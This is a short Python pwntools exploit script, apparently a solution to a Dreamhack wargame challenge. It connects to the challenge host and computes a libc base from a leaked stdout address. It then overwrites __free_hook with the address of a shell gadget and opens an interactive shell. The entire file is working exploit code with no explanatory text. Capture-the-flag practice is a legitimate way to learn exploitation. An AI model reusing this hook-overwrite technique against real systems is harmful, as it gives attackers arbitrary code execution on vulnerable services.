from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 23572
r = remote(HOST, PORT)

r.recvuntil(b'stdout: ')
stdout = int(r.recvline().strip().decode(),16)
libc = stdout - 0x3c5620
free_hook = libc + 0x3c67a8
sh = 0x400a11

payload = p64(free_hook) + p64(sh)
r.sendlineafter(b'Size: ', str(len(payload)).encode())
r.sendlineafter(b'Data: ', payload)

r.interactive()